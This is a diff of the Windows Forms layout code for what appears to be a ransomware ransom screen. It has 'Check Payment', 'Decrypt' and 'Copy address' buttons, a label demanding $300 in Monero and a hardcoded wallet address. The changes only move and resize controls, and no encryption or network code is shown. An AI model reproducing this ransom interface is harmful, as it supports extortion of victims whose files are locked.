@@ -44,11 +44,11 @@ namespace S4VEtheD4TE
             this.linkLabel3 = new System.Windows.Forms.LinkLabel();
             this.button1 = new System.Windows.Forms.Button();
             this.groupBox1 = new System.Windows.Forms.GroupBox();
-            this.pictureBox2 = new System.Windows.Forms.PictureBox();
-            this.label5 = new System.Windows.Forms.Label();
-            this.textBox1 = new System.Windows.Forms.TextBox();
-            this.button2 = new System.Windows.Forms.Button();
             this.button3 = new System.Windows.Forms.Button();
+            this.button2 = new System.Windows.Forms.Button();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.label5 = new System.Windows.Forms.Label();
+            this.pictureBox2 = new System.Windows.Forms.PictureBox();
             ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
             ((System.ComponentModel.ISupportInitialize)(this.pictureBox3)).BeginInit();
             this.groupBox1.SuspendLayout();
@@ -175,7 +175,7 @@ namespace S4VEtheD4TE
             this.button1.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
             this.button1.Location = new System.Drawing.Point(6, 108);
             this.button1.Name = "button1";
-            this.button1.Size = new System.Drawing.Size(250, 33);
+            this.button1.Size = new System.Drawing.Size(172, 33);
             this.button1.TabIndex = 13;
             this.button1.Text = "Check Payment";
             this.button1.UseVisualStyleBackColor = true;
@@ -194,27 +194,25 @@ namespace S4VEtheD4TE
             this.groupBox1.TabIndex = 15;
             this.groupBox1.TabStop = false;
             // 
-            // pictureBox2
+            // button3
             // 
-            this.pictureBox2.BackColor = System.Drawing.Color.White;
-            this.pictureBox2.Image = global::S4VEtheD4TE.Properties.Resources.monero_accepted_here;
-            this.pictureBox2.Location = new System.Drawing.Point(6, 13);
-            this.pictureBox2.Name = "pictureBox2";
-            this.pictureBox2.Size = new System.Drawing.Size(231, 59);
-            this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
-            this.pictureBox2.TabIndex = 12;
-            this.pictureBox2.TabStop = false;
+            this.button3.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
+            this.button3.Location = new System.Drawing.Point(596, 108);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(172, 33);
+            this.button3.TabIndex = 16;
+            this.button3.Text = "Copy address";
+            this.button3.UseVisualStyleBackColor = true;
             // 
-            // label5
+            // button2
             // 
-            this.label5.AutoSize = true;
-            this.label5.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
-            this.label5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(128)))));
-            this.label5.Location = new System.Drawing.Point(348, 30);
-            this.label5.Name = "label5";
-            this.label5.Size = new System.Drawing.Size(339, 21);
-            this.label5.TabIndex = 13;
-            this.label5.Text = "Send $300 worth of Monero to this address:";
+            this.button2.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
+            this.button2.Location = new System.Drawing.Point(184, 108);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(172, 33);
+            this.button2.TabIndex = 15;
+            this.button2.Text = "Decrypt";
+            this.button2.UseVisualStyleBackColor = true;
             // 
             // textBox1
             // 
@@ -227,25 +225,27 @@ namespace S4VEtheD4TE
             this.textBox1.Text = "888tNkZrPN6JsEgekjMnABU4TBzc2Dt29EPAvkRxbANsAnjyPbb3iQ1YBRk1UXcdRsiKc9dhwMVgN5S9c" +
     "QUiyoogDavup3H";
             // 
-            // button2
+            // label5
             // 
-            this.button2.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
-            this.button2.Location = new System.Drawing.Point(262, 108);
-            this.button2.Name = "button2";
-            this.button2.Size = new System.Drawing.Size(250, 33);
-            this.button2.TabIndex = 15;
-            this.button2.Text = "Decrypt";
-            this.button2.UseVisualStyleBackColor = true;
+            this.label5.AutoSize = true;
+            this.label5.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
+            this.label5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(128)))));
+            this.label5.Location = new System.Drawing.Point(305, 31);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(339, 21);
+            this.label5.TabIndex = 13;
+            this.label5.Text = "Send $300 worth of Monero to this address:";
             // 
-            // button3
+            // pictureBox2
             // 
-            this.button3.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
-            this.button3.Location = new System.Drawing.Point(518, 108);
-            this.button3.Name = "button3";
-            this.button3.Size = new System.Drawing.Size(250, 33);
-            this.button3.TabIndex = 16;
-            this.button3.Text = "Copy address";
-            this.button3.UseVisualStyleBackColor = true;
+            this.pictureBox2.BackColor = System.Drawing.Color.White;
+            this.pictureBox2.Image = global::S4VEtheD4TE.Properties.Resources.monero_accepted_here;
+            this.pictureBox2.Location = new System.Drawing.Point(6, 13);
+            this.pictureBox2.Name = "pictureBox2";
+            this.pictureBox2.Size = new System.Drawing.Size(172, 59);
+            this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
+            this.pictureBox2.TabIndex = 12;
+            this.pictureBox2.TabStop = false;
             // 
             // Main
             // 
